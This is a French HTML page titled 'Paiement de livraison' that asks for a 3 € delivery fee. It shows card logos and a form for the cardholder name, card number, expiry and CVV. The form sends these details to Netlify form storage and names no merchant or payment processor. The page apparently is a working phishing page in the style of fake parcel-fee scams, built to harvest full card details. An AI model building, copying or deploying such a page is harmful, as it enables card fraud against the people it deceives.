
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Paiement de livraison</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      padding: 25px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 320px;
    }
    h2 {
      text-align: center;
    }
    .card-icons {
      text-align: center;
      margin-bottom: 15px;
    }
    .card-icons img {
      height: 25px;
      margin: 0 4px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .btn {
      background-color: #007bff;
      color: #fff;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card-icons">
      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png"/>
      <img src="https://img.icons8.com/color/48/000000/visa.png"/>
      <img src="https://img.icons8.com/color/48/000000/amex.png"/>
      <img src="https://img.icons8.com/color/48/000000/discover.png"/>
      <img src="https://img.icons8.com/color/48/000000/jcb.png"/>
    </div>
    <h2>Paiement de livraison</h2>
    <form name="paiement" method="POST" data-netlify="true" action="confirmation.html">
      <input type="text" name="nom" placeholder="Nom sur la carte" required>
      <input type="text" name="numero" placeholder="N° de carte" required>
      <input type="text" name="expiration" placeholder="MM/AA" required>
      <input type="text" name="cvv" placeholder="CVV" required>
      <button type="submit" class="btn">Payer 3 €</button>
    </form>
  </div>
</body>
</html>
